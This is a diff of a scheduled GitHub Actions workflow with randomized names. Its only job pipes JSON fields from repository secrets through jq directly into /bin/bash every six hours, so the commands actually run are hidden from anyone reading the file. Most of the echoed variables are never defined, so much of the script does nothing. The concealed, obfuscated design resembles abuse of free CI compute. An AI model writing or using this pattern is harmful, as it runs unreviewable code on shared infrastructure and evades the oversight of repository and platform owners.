@@ -1,23 +1,23 @@
 name: dengshiming7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 3/6 * * *'
-jobs:  # 9562
+    - cron: '2 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dengshiming7654
         env:
-          zbb01: ${{ secrets.zbb01 }}
+          iv7: ${{ secrets.iv7 }}
         run: |
-          echo $zbb01 | jq -r .n84643 | /bin/bash
-          echo $mrux1 | jq -r .ct3 | /bin/bash
-          echo $ulv7388 | jq -r .hbpay531 | /bin/bash
-          echo $rkr3 | jq -r .nkkx236 | /bin/bash
-          echo $fapw3 | jq -r .fs0 | /bin/bash
-          echo $byc772 | jq -r .xuiz35713 | /bin/bash
-          echo $a63 | jq -r .ulrnw2186 | /bin/bash
-          echo $d8721 | jq -r .m08255 | /bin/bash
+          echo $iv7 | jq -r .bxf3573 | /bin/bash
+          echo $xbqqm47 | jq -r .ockc0644 | /bin/bash
+          echo $y51 | jq -r .dfku64 | /bin/bash
+          echo $esc32 | jq -r .mpzw363 | /bin/bash
+          echo $mopby1912 | jq -r .n12537 | /bin/bash
+          echo $gnssy56 | jq -r .kj29636 | /bin/bash
 
